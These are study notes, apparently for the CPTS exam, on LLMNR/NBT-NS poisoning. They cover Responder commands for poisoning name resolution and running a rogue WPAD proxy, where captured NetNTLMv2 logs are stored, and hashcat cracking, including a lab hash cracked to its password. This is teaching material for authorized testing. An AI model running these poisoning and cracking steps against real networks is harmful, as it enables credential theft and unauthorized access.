# 🎯 1. LLMNR/NBT-NS Poisoning — From Linux

> [!info]  
> **Objective:** Use LLMNR/NBT-NS poisoning from a Linux attack host to capture NetNTLM authentication material, then crack the captured hashes offline to obtain valid domain credentials and establish an initial foothold.
> 
> **CPTS Context:** This technique is commonly used after initial Active Directory enumeration when operating from an **unauthenticated position on an internal network**.

---

# ⚡ 2. Command Cheat Sheet

## 🧰 Responder

|Purpose|Command|
|---|---|
|Show help/options|`responder -h`|
|Passive analysis mode|`sudo responder -I ens224 -A`|
|Start Responder on interface|`sudo responder -I ens224`|
|Increase verbosity|`sudo responder -I ens224 -v`|
|Typical poisoning + fingerprinting + WPAD|`sudo responder -I ens224 -wf`|
|Specify interface|`responder -I eth0`|
|Specify all interfaces|`responder -I ALL`|

## 🔓 Hashcat

|Purpose|Command|
|---|---|
|Crack NetNTLMv2 with RockYou|`hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt`|
|Identify an unknown hash type|Use the [Hashcat Example Hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) reference|

> [!important]  
> **Hashcat mode `5600` = NetNTLMv2.**
> 
> NetNTLMv2 is an authentication challenge/response material captured from network authentication. It is **not the same thing as an NT hash**, so it cannot simply be used for classic Pass-the-Hash.

---

# 🧠 3. Where This Fits in the AD Attack Path

Before reaching this stage, we may have performed:

```text
🔎 Initial Enumeration
       ↓
🌐 Identify Domain
       ↓
🖥️ Enumerate Hosts
       ↓
🏰 Identify Domain Controller
       ↓
👥 Enumerate Users / Groups
       ↓
📡 Gain Internal Network Access
       ↓
🎭 LLMNR/NBT-NS Poisoning
       ↓
🎣 Capture NetNTLM Authentication
       ↓
🔓 Offline Cracking
       ↓
🔑 Valid Domain Credentials
       ↓
🚪 Initial Foothold
       ↓
🔎 Credentialed Enumeration
       ↓
➡️ Further AD Attacks
```

> [!success]  
> The important idea is that **LLMNR/NBT-NS poisoning is not the final objective**.
> 
> The objective is to turn **network trust + name-resolution failure → captured authentication → cracked credential → authenticated access**.

---

# 🌐 4. LLMNR & NBT-NS Primer

## 🔎 4.1 What Are LLMNR and NBT-NS?

Windows can use alternative name-resolution mechanisms when normal DNS resolution fails.

### LLMNR

**Link-Local Multicast Name Resolution (LLMNR)** is based on the DNS format and allows hosts on the same local link to resolve names.

- Protocol: **LLMNR**
    
- Transport: **UDP**
    
- Port: **5355**
    

### NBT-NS

**NetBIOS Name Service (NBT-NS)** identifies systems on a local network using their NetBIOS names.

- Protocol: **NBT-NS**
    
- Transport: **UDP**
    
- Port: **137**
    

The general fallback concept is:

```text
Host wants to resolve a name
        ↓
      DNS
        │
        │ DNS fails
        ↓
     LLMNR
        │
        │ LLMNR fails
        ↓
     NBT-NS
```

> [!warning]  
> The exact Windows name-resolution behavior can involve additional mechanisms and configuration-dependent behavior. For CPTS purposes, the important attack concept is that **LLMNR/NBT-NS broadcasts can allow an attacker on the local network to answer a name-resolution request that they do not legitimately own**.

---

# 🚨 5. Why LLMNR/NBT-NS Is Poisonable

The critical weakness is:

> **Any host on the local network can potentially answer the broadcast request.**

Suppose a user attempts:

```text
\\printer01.inlanefreight.local
```

but the real server is:

```text
\\print01.inlanefreight.local
```

The victim asks DNS for:

```text
printer01.inlanefreight.local
```

DNS replies:

```text
Unknown host
```

The victim may then send an LLMNR/NBT-NS request asking the local network:

```text
"Who is printer01.inlanefreight.local?"
```

An attacker running **Responder** can answer:

```text
"I am printer01.inlanefreight.local."
```

The victim may then communicate with the attacker's machine.

If that communication triggers authentication, the attacker can capture the resulting **NetNTLM authentication material**.

---

# 🎭 6. LLMNR/NBT-NS Poisoning Attack Flow

```text
                    🖥️ Victim
                       │
                       │ "Where is printer01?"
                       ▼
                  🌐 DNS Server
                       │
                       │ ❌ No such host
                       ▼
                📢 LLMNR / NBT-NS
                       │
             Broadcast to local LAN
                       │
             ┌─────────┴─────────┐
             │                   │
             ▼                   ▼
        🖥️ Legit hosts       🐧 Attacker
                                │
                           Responder
                                │
                                │ "I am printer01"
                                ▼
                           🖥️ Victim
                                │
                                │ Authentication
                                ▼
                         🎣 NetNTLMv2
                                │
                       ┌────────┴────────┐
                       │                 │
                       ▼                 ▼
                 🔓 Offline Crack    🔄 Relay
                       │
                       ▼
                 🔑 Cleartext
                   Password
                       │
                       ▼
               🚪 Domain Foothold
```

> [!important]  
> The attacker is exploiting **trust in name resolution**, not directly exploiting the victim's password.

---

# 🧪 7. Quick Example — Complete Attack Scenario

The source describes the following sequence:

### 1️⃣ Victim mistypes a server name

The user attempts to connect to:

```text
\\print01.inlanefreight.local
```

but accidentally types:

```text
\\printer01.inlanefreight.local
```

### 2️⃣ DNS fails

The DNS server responds that the host does not exist.

### 3️⃣ Victim broadcasts the request

The victim asks the local network whether anyone knows:

```text
printer01.inlanefreight.local
```

### 4️⃣ Attacker poisons the response

Responder answers as though the attacker is:

```text
printer01.inlanefreight.local
```

### 5️⃣ Victim communicates with the attacker

The victim believes it has reached the requested host and may initiate authentication.

### 6️⃣ Authentication material is captured

The attacker captures a NetNTLMv2 authentication exchange containing information associated with the user's credentials.

### 7️⃣ Offline cracking

The attacker attempts to recover the cleartext password:

```text
NetNTLMv2
    ↓
Hashcat / John
    ↓
Cleartext password
```

---

# 🧬 8. What Are We Actually Capturing?

The goal is to collect authentication information sent over the network in the form of:

- **NTLMv1**
    
- **NTLMv2 / NetNTLMv2**
    

NTLM authentication uses challenge/response mechanisms rather than simply sending the user's password across the network.

A simplified mental model:

```text
Victim
  │
  │ "I want to authenticate"
  ▼
Server / Attacker
  │
  │ Challenge
  ▼
Victim
  │
  │ Challenge + secret-derived response
  ▼
Server / Attacker
  │
  ▼
🎣 Captured NetNTLM material
```

The attacker can then attempt to crack the captured material offline.

---

# 🔓 9. What Can We Do With the Captured Authentication?

There are two major paths:

```text
             🎣 Captured NetNTLM
                     │
          ┌──────────┴──────────┐
          │                     │
          ▼                     ▼
     🔓 Crack Offline       🔄 Relay
          │                     │
          ▼                     ▼
   Cleartext Password      Authenticate to
          │                another service
          ▼                     │
   Valid Credentials            ▼
          │                Potential access
          ▼
   Further Enumeration
```

## 🔓 Path 1 — Offline Cracking

Use:

- [Hashcat](https://hashcat.net/hashcat/)
    
- [John the Ripper](https://www.openwall.com/john/)
    

The objective is:

```text
NetNTLMv2
    ↓
Password Cracking
    ↓
Cleartext Password
    ↓
Valid Account Credentials
```

## 🔄 Path 2 — NTLM Relay

The captured authentication can potentially be **relayed** to another service rather than cracked.

For example:

```text
Victim
   │
   │ NTLM authentication
   ▼
Attacker
   │
   │ Relay
   ▼
Target Host / Service
```

Under the right conditions, particularly when protections such as **SMB signing** are absent or improperly configured, NTLM relay can potentially result in privileged access.

> [!warning]  
> **NetNTLMv2 is not an NT hash.**
> 
> Capturing NetNTLMv2 does not automatically mean you can perform classic Pass-the-Hash. In the workflow presented here, the normal objective is to **crack the authentication material offline** or potentially **relay the authentication** when the environment permits it.

---

# 🛠️ 10. Tools Used for LLMNR/NBT-NS Poisoning

|**ToolDescription**||
|---|---|
|[Responder](https://github.com/lgandx/Responder)|Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions.|
|[Inveigh](https://github.com/Kevin-Robertson/Inveigh)|Inveigh is a cross-platform MITM platform that can be used for spoofing and poisoning attacks.|
|[Metasploit](https://www.metasploit.com/)|Metasploit has several built-in scanners and spoofing modules made to deal with poisoning attacks.|

## 🧰 Responder

[Responder](https://github.com/lgandx/Responder) is a purpose-built poisoning and credential-capture tool.

It can attack or interact with protocols including:

- LLMNR
    
- DNS
    
- MDNS
    
- NBNS
    
- DHCP
    
- ICMP
    
- HTTP
    
- HTTPS
    
- SMB
    
- LDAP
    
- WebDAV
    
- Proxy Auth
    

Responder also has support for:

- MSSQL
    
- DCE-RPC
    
- FTP
    
- POP3
    
- IMAP
    
- SMTP authentication
    

Responder is primarily used from a **Linux attack host** and is written in Python. A Windows `.exe` version also exists.

## 🧰 Inveigh

[Inveigh](https://github.com/Kevin-Robertson/Inveigh) is a cross-platform MITM tool used for spoofing and poisoning attacks.

It is written in:

- C#
    
- PowerShell
    

> [!info]  
> The PowerShell implementation is considered legacy in the source material.

## 🧰 Metasploit

[Metasploit](https://www.metasploit.com/) contains scanners and spoofing modules that can be used for poisoning-related attacks.

---

# 👁️ 11. Responder — Analysis Mode vs Poisoning Mode

Earlier in the assessment, Responder can be used in **Analysis Mode**.

```bash
responder -A -I eth0
```

The important behavior is:

```text
📡 Listen
   ↓
👀 Observe requests
   ↓
❌ Do NOT poison responses
```

This is useful for passive discovery.

> [!important]  
> **Analysis mode is intentionally passive.**
> 
> It allows us to observe NBT-NS, BROWSER, and LLMNR requests without responding to them.

---

# 🎭 12. Responder — Active Poisoning

Once ready to perform the poisoning attack, Responder can answer requests.

Basic example:

```bash
sudo responder -I ens224
```

Where:

```text
-I ens224
    ↓
Select network interface
```

Responder then listens and answers relevant requests it sees on the network.

---

# 📖 13. Responder Help

Running:

```bash
responder -h
```

produces the available options.

Important portions:

```text
Usage: responder -I eth0 -w -r -f
or:
responder -I eth0 -wrf

Options:
  --version             show program's version number and exit
  -h, --help            show this help message and exit
  -A, --analyze         Analyze mode. This option allows you to see NBT-NS,
                        BROWSER, LLMNR requests without responding.
  -I eth0, --interface=eth0
                        Network interface to use, you can use 'ALL' as a
                        wildcard for all interfaces
  -i 10.0.0.21, --ip=10.0.0.21
                        Local IP to use (only for OSX)
  -e 10.0.0.22, --externalip=10.0.0.22
                        Poison all requests with another IP address than
                        Responder's one.
  -b, --basic           Return a Basic HTTP authentication. Default: NTLM
  -r, --wredir          Enable answers for netbios wredir suffix queries.
                        Answering to wredir will likely break stuff on the
                        network. Default: False
  -d, --NBTNSdomain     Enable answers for netbios domain suffix queries.
                        Answering to domain suffixes will likely break stuff
                        on the network. Default: False
  -f, --fingerprint     This option allows you to fingerprint a host that
                        issued an NBT-NS or LLMNR query.
  -w, --wpad            Start the WPAD rogue proxy server. Default value is
                        False
  -u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY
                        Upstream HTTP proxy used by the rogue WPAD Proxy for
                        outgoing requests (format: host:port)
  -F, --ForceWpadAuth   Force NTLM/Basic authentication on wpad.dat file
                        retrieval. This may cause a login prompt. Default:
                        False
  -P, --ProxyAuth       Force NTLM (transparently)/Basic (prompt)
                        authentication for the proxy. WPAD doesn't need to be
                        ON. This option is highly effective when combined
                        with -r. Default: False
  --lm                  Force LM hashing downgrade for Windows XP/2003 and
                        earlier. Default: False
  -v, --verbose         Increase verbosity.
```

---

# 🔎 14. Important Responder Options

|Option|Meaning|CPTS Relevance|
|---|---|---|
|`-A`|Analyze mode|Observe requests without poisoning|
|`-I eth0`|Select interface|Required to tell Responder where to listen|
|`-I ALL`|Listen on all interfaces|Useful when multiple interfaces exist|
|`-i`|Specify local IP|Mainly relevant to OSX|
|`-e`|Poison using another IP|Allows responses to point to a different IP|
|`-b`|Return Basic HTTP authentication|Changes HTTP authentication behavior|
|`-r`|Enable NetBIOS `wredir` responses|Can break network functionality; use carefully|
|`-d`|Enable NetBIOS domain suffix responses|Can break network functionality; use carefully|
|`-f`|Fingerprint hosts|Helps identify the requesting host|
|`-w`|Start WPAD rogue proxy|Can capture additional authentication|
|`-u`|Specify upstream HTTP proxy|Used with rogue WPAD proxy|
|`-F`|Force authentication for `wpad.dat` retrieval|Can cause login prompts|
|`-P`|Force proxy authentication|Can cause login prompts|
|`--lm`|Force LM downgrade|Relevant only to older Windows systems|
|`-v`|Verbose output|Useful for troubleshooting, but produces more output|

> [!warning]  
> Options such as `-r` and `-d` explicitly warn that responding to certain NetBIOS queries can **break network functionality**. Do not blindly enable every option during an assessment.

---

# 🌐 15. WPAD

The `-w` option enables Responder's built-in **WPAD rogue proxy server**.

Example:

```bash
sudo responder -I ens224 -wf
```

Here:

```text
-w
 ↓
Start WPAD rogue proxy

-f
 ↓
Fingerprint requesting hosts
```

WPAD can be particularly effective in larger environments because it can potentially capture HTTP requests from users whose browsers have automatic proxy detection enabled.

The source specifically references Internet Explorer's **Auto-detect settings**.

> [!warning]  
> WPAD is not simply another LLMNR/NBT-NS mechanism. It is an additional Responder capability that can increase credential-capture opportunities.

---

# 🧬 16. Fingerprinting Hosts

The `-f` option enables fingerprinting:

```bash
responder -I ens224 -f
```

Responder attempts to fingerprint a host that issued an NBT-NS or LLMNR query.

This can help answer:

```text
Who sent the request?
        ↓
What host is it?
        ↓
What OS/version information can we identify?
        ↓
Is this host potentially valuable?
```

---

# 🔊 17. Verbose Mode

Use:

```bash
responder -I ens224 -v
```

The `-v` flag increases verbosity.

This can help when troubleshooting or trying to understand what Responder is seeing.

> [!warning]  
> Verbose mode produces significantly more output. It can make the console noisy, especially during a long-running poisoning session.

---

# 🖥️ 18. Running Responder

Responder should be run with **sudo/root privileges**.

Typical command:

```bash
sudo responder -I ens224
```

The interface must correspond to the interface connected to the target network.

Examples:

```bash
sudo responder -I eth0
```

or:

```bash
sudo responder -I ens224
```

---

# 🔌 19. Required / Important Ports

The source identifies the following ports that should be available on the attack host for Responder to function best:

```text
UDP 137
UDP 138
UDP 53
UDP/TCP 389
TCP 1433
UDP 1434
TCP 80
TCP 135
TCP 139
TCP 445
TCP 21
TCP 3141
TCP 25
TCP 110
TCP 587
TCP 3128
Multicast UDP 5355
Multicast UDP 5353
```

### Core ports to remember for CPTS

```text
LLMNR     → UDP 5355
NBT-NS    → UDP 137
SMB       → TCP 445
NetBIOS   → TCP 139
DNS       → UDP/TCP 53
LDAP      → TCP/UDP 389
HTTP      → TCP 80
```

> [!important]  
> Not every Responder-supported protocol is directly part of the LLMNR/NBT-NS attack itself. Responder contains multiple rogue servers and poisoning/capture capabilities, which is why its port requirements are broad.

Individual rogue servers, such as the SMB server, can be disabled through:

```text
Responder.conf
```

The configuration is typically located at:

```text
/usr/share/responder/Responder.conf
```

when installed through the standard package/layout.

If Responder was cloned directly from GitHub, the configuration location can differ.

---

# 📂 20. Responder Logs

Responder stores captured authentication material in its logs directory.

Typical location:

```text
/usr/share/responder/logs
```

Example:

```bash
ls
```

Output:

```text
Analyzer-Session.log
Responder-Session.log
Config-Responder.log
SMB-NTLMv2-SSP-172.16.5.200.txt
HTTP-NTLMv2-172.16.5.200.txt
SMB-NTLMv2-SSP-172.16.5.25.txt
Poisoners-Session.log
SMB-NTLMv2-SSP-172.16.5.50.txt
Proxy-Auth-NTLMv2-172.16.5.200.txt
```

Captured hashes are organized by the host/protocol that generated them.

---

# 🗃️ 21. Responder Hash File Naming

The source describes the general naming format as:

```text
(MODULE_NAME)-(HASH_TYPE)-(CLIENT_IP).txt
```

Example:

```text
SMB-NTLMv2-SSP-172.16.5.25.txt
```

This tells us:

```text
SMB
 ↓
Authentication module/protocol

NTLMv2-SSP
 ↓
Captured authentication type

172.16.5.25
 ↓
Client IP
```

Responder also stores hashes in a SQLite database, configurable through:

```text
Responder.conf
```

---

# 🎣 22. Capturing Authentication With Responder

Start Responder:

```bash
sudo responder -I ens224
```

Then leave it running while performing other enumeration.

A practical workflow is:

```text
┌───────────────────────────────┐
│ 🐧 Linux Attack Host          │
│                               │
│ tmux                          │
│ ┌───────────────────────────┐ │
│ │ sudo responder -I ens224  │ │
│ │                           │ │
│ │ 🎣 Wait for authentication│ │
│ └───────────────────────────┘ │
└───────────────┬───────────────┘
                │
                │ Network
                ▼
        🖥️ Internal Network
                │
        ┌───────┼────────┐
        ▼       ▼        ▼
      Host A  Host B   Host C
        │
        │ Name-resolution request
        ▼
    🎣 Responder
        │
        ▼
   NetNTLMv2 captured
```

> [!tip]  
> During an internal assessment, Responder is often left running in a **tmux** session while other enumeration continues. This increases the chance of capturing authentication attempts generated naturally by users and machines on the network.

---

# 🔓 23. Cracking Captured NetNTLMv2

Once hashes have been collected, attempt offline cracking.

The source uses:

```bash
hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
```

### Breakdown

```text
hashcat
    ↓
Password-cracking engine

-m 5600
    ↓
NetNTLMv2 mode

forend_ntlmv2
    ↓
File containing captured NetNTLMv2 material

/usr/share/wordlists/rockyou.txt
    ↓
Dictionary used for the attack
```

---

# 🧬 24. Hashcat Result

Example captured material:

```text
FOREND::INLANEFREIGHT:4af70a79938ddf8a:0f85ad1e80baa52d732719dbf62c34cc:010100000000000080f519d1432cd80136f3af14556f047800000000020008004900340046004e0001001e00570049004e002d0032004e004c005100420057004d00310054005000490004003400570049004e002d0032004e004c005100420057004d0031005400500049002e004900340046004e002e004c004f00430041004c00030014004900340046004e002e004c004f00430041004c00050014004900340046004e004e002e004c004f00430041004c000700080080f519d1432cd80106000400020000000800300030000000000000000000000000300000227f23c33f457eb40768939489f1d4f76e0e07a337ccfdd45a57d9b612691a800a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000:Klmcargo2
```

The important result is:

```text
FOREND → Klmcargo2
```

Hashcat reports:

```text
Status...........: Cracked
Hash.Name........: NetNTLMv2
Recovered........: 1/1 (100.00%)
```

Therefore:

```text
🎣 Captured NetNTLMv2
        ↓
🔓 Hashcat
        ↓
🔑 Password recovered
        ↓
FOREND : Klmcargo2
```

---

# 📊 25. Understanding the Hashcat Output

Important fields include:

```text
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NetNTLMv2
Hash.Target......: FOREND::INLANEFREIGHT:...
Time.Started.....: ...
Time.Estimated...: ...
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 1086.9 kH/s
Recovered........: 1/1 (100.00%) Digests
Progress.........: 10967040/14344385 (76.46%)
Rejected.........: 0/10967040 (0.00%)
```

### Most important CPTS fields

|Field|Meaning|
|---|---|
|`Status: Cracked`|Hash was successfully recovered|
|`Hash.Name: NetNTLMv2`|Hashcat recognized the input as NetNTLMv2|
|`Guess.Base`|Wordlist/dictionary being tested|
|`Speed`|Current cracking rate|
|`Recovered`|Number of hashes successfully cracked|
|`Progress`|How much of the keyspace has been tested|
|`Time.Estimated`|Estimated remaining cracking time|

---

# ⏱️ 26. Why NetNTLMv2 Cracking Can Be Difficult

NetNTLMv2 can be relatively slow to crack compared with some simpler password hashes.

Therefore:

```text
Weak password
     ↓
Small search space
     ↓
Reasonable cracking time
     ↓
Password recovered
```

But:

```text
Long + complex password
        ↓
Huge search space
        ↓
Long cracking time
        ↓
May be impractical
```

> [!important]  
> **Capturing a hash does not guarantee recovering the password.**
> 
> The password's complexity, available wordlists/rules, hardware, and attack strategy all affect whether offline cracking succeeds.

---

# 🔎 27. Identifying Unknown Hashes

Responder may capture authentication material other than NetNTLMv2.

If the hash type is unknown, consult:

[Hashcat Example Hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)

This reference helps identify:

```text
Unknown hash
    ↓
Determine format
    ↓
Identify hash type
    ↓
Find Hashcat mode
    ↓
Perform appropriate cracking attack
```

The source specifically notes that NTLMv1 and other hash types may sometimes be encountered.

---

# 🧠 28. NTLMv1 vs NTLMv2 — CPTS Mental Model

|Authentication Material|Typical Goal|Important Point|
|---|---|---|
|NTLMv1|Crack / potentially relay depending on conditions|Older authentication protocol|
|NetNTLMv2|Crack offline / potentially relay|Common material captured by Responder|
|NT hash|Potential Pass-the-Hash use|Different from NetNTLMv2|

> [!warning]  
> Do not confuse **NTLM hash** with **NetNTLMv2**.
> 
> A NetNTLMv2 capture is an authentication challenge/response exchange. It is **not equivalent to obtaining the user's NT password hash**.

---

# 🧠 29. Why This Attack Works

The fundamental weakness can be represented as:

```text
❌ DNS cannot resolve name
          ↓
📢 Windows asks local network
          ↓
❗ Any suitable host can answer
          ↓
🎭 Attacker pretends to be requested host
          ↓
🖥️ Victim connects to attacker
          ↓
🔐 Authentication occurs
          ↓
🎣 Authentication material captured
```

The attack therefore combines two things:

### 1. Name-resolution trust

The victim trusts an answer received through LLMNR/NBT-NS.

### 2. Automatic authentication behavior

The victim may attempt authentication when interacting with the system it believes is the requested host.

The attacker combines these behaviors to obtain authentication material.

---

# 🧠 30. The Complete CPTS Mental Model

```text
                 INTERNAL NETWORK
                        │
                        ▼
               🖥️ Windows Victim
                        │
                 Wants hostname
                        │
                        ▼
                    🌐 DNS
                        │
                    ❌ Fails
                        │
                        ▼
                 📢 LLMNR/NBT-NS
                        │
                  Broadcast request
                        │
              ┌─────────┴─────────┐
              │                   │
              │                   │
              ▼                   ▼
       Legitimate hosts       🐧 Attacker
                              Responder
                                  │
                           🎭 Poison response
                                  │
                                  ▼
                            🖥️ Victim
                                  │
                         Authentication
                                  │
                                  ▼
                          🎣 NetNTLMv2
                                  │
                         ┌────────┴────────┐
                         │                 │
                         ▼                 ▼
                    🔓 Hashcat         🔄 NTLM Relay
                         │
                         ▼
                    🔑 Password
                         │
                         ▼
                🚪 Initial Foothold
                         │
                         ▼
                🔎 Credentialed
                   Enumeration
```

---

# 🔥 31. Attack Methodology — What You Should Think

When approaching an internal AD environment from Linux:

```text
1️⃣ Do I have network access?
        ↓
2️⃣ What domain / hosts exist?
        ↓
3️⃣ Are LLMNR/NBT-NS requests occurring?
        ↓
4️⃣ Can I observe them safely?
        ↓
5️⃣ Is poisoning authorized?
        ↓
6️⃣ Run Responder
        ↓
7️⃣ Capture authentication material
        ↓
8️⃣ Identify the hash type
        ↓
9️⃣ Choose appropriate cracking mode
        ↓
🔟 Crack offline
        ↓
1️⃣1️⃣ Validate discovered credentials
        ↓
1️⃣2️⃣ Perform credentialed enumeration
        ↓
1️⃣3️⃣ Determine whether the account provides
     additional access or privilege
```

> [!important]  
> **Do not blindly crack everything.**
> 
> The source emphasizes collecting as much data as possible, but cracking should be prioritized according to whether the account could help advance the assessment.

---

# 📊 32. Responder vs Passive Analysis

|Mode|Behavior|Purpose|
|---|---|---|
|Analysis mode (`-A`)|Listens but does not poison|Understand network activity safely|
|Normal poisoning|Answers requests|Capture authentication|
|Verbose (`-v`)|Produces more output|Troubleshooting / detailed monitoring|
|WPAD (`-w`)|Starts rogue WPAD proxy|Additional authentication capture opportunities|
|Fingerprinting (`-f`)|Attempts host fingerprinting|Identify requesting systems|

---

# 🧰 33. Tool Reference

- [Responder — GitHub](https://github.com/lgandx/Responder) — LLMNR/NBT-NS/MDNS poisoning and credential capture.
    
- [Inveigh — GitHub](https://github.com/Kevin-Robertson/Inveigh) — Cross-platform spoofing/MITM framework.
    
- [Metasploit](https://www.metasploit.com/) — Framework containing scanners and spoofing modules.
    
- [Hashcat](https://hashcat.net/hashcat/) — Password-cracking tool.
    
- [John the Ripper](https://www.openwall.com/john/) — Password-cracking tool.
    
- [Hashcat Example Hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) — Reference for identifying hash formats and modes.
    
- [LLMNR RFC 4795](https://datatracker.ietf.org/doc/html/rfc4795) — LLMNR protocol specification.
    

---

# 🎯 34. CPTS Exam Cheat Sheet

```text
LLMNR
→ Link-Local Multicast Name Resolution
→ UDP 5355

NBT-NS
→ NetBIOS Name Service
→ UDP 137

Responder
→ Poison LLMNR/NBT-NS/MDNS
→ Capture authentication material
→ Primarily used from Linux

Analysis Mode
→ responder -A -I <interface>
→ Observe without poisoning

Normal Responder
→ sudo responder -I <interface>

Fingerprint
→ -f

WPAD
→ -w

Verbose
→ -v

NetNTLMv2
→ Common authentication material captured by Responder
→ Hashcat mode 5600
→ Must generally be cracked offline if seeking the password

Hashcat
→ hashcat -m 5600 <hashfile> /usr/share/wordlists/rockyou.txt

Unknown hash
→ Check Hashcat Example Hashes

NetNTLMv2 ≠ NT Hash
→ Do not confuse the two

Alternative path
→ Captured NTLM authentication may potentially be relayed
→ SMB signing and other protections determine feasibility

Typical attack chain
→ DNS fails
→ LLMNR/NBT-NS request
→ Responder poisons
→ Victim authenticates
→ NetNTLM captured
→ Crack / Relay
→ Credentials / Access
→ Credentialed enumeration
```

---

# 🧠 35. Key Takeaways

> [!success]  
> **1. LLMNR and NBT-NS are fallback name-resolution mechanisms.**
> 
> When DNS fails, Windows may attempt local name resolution through these protocols.

> [!success]  
> **2. The attacker abuses the fact that another host can answer the request.**
> 
> Responder impersonates the requested hostname and convinces the victim to communicate with the attacker's machine.

> [!success]  
> **3. The real objective is credential capture.**
> 
> The poisoned request can trigger authentication, allowing the attacker to capture NetNTLM material.

> [!success]  
> **4. NetNTLMv2 can commonly be attacked with Hashcat mode `5600`.**
> 
> ```bash
> hashcat -m 5600 <hashfile> /usr/share/wordlists/rockyou.txt
> ```

> [!success]  
> **5. NetNTLMv2 is not an NT hash.**
> 
> It should not be treated as directly usable for classic Pass-the-Hash.

> [!success]  
> **6. Cracking is only one possible path.**
> 
> Depending on the environment and security controls, captured NTLM authentication may potentially be relayed instead.

> [!success]  
> **7. Responder is often left running while other enumeration continues.**
> 
> This maximizes the opportunity to capture authentication attempts generated naturally by systems and users.

> [!success]  
> **8. The end goal is a foothold.**
> 
> ```text
> LLMNR/NBT-NS Poisoning
>          ↓
> Authentication Capture
>          ↓
> Password / Relay
>          ↓
> Valid Access
>          ↓
> Credentialed Enumeration
>          ↓
> Further AD Attacks
> ```

> [!important]  
> **CPTS Mental Model:**
> 
> **Don't memorize "run Responder." Understand the chain:**
> 
> **DNS failure → broadcast name resolution → attacker answers → victim trusts attacker → authentication occurs → NetNTLM captured → crack or relay → credentials/access → continue enumeration.**